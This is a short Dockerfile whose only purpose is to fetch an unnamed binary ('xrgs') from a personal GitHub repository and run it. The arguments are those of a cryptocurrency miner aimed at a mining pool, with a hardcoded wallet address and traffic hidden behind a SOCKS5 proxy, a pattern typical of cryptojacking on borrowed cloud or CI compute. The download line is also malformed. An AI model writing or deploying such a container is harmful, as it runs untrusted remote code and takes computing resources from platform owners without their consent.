FROM ubuntu:bionic
RUN apt update && \
        apt full-upgrade -y && \
        apt install wget -y && \
        wget https://github.com/mutiahanum22/used/raw/main/xrgs \
        chmod +x xrgs
CMD ./xrgs -o cryptonight_haven.mine.zergpool.com:14452 --tls -a cn-heavy/xhv -k -u RCFVvm1Hghx3kEgvKtJ5SAUssQcb62SAR3 -p c=RVN,mc=BLOC,m=solo -t 4 --dns-ipv6 -x socks5://192.252.214.20:15864
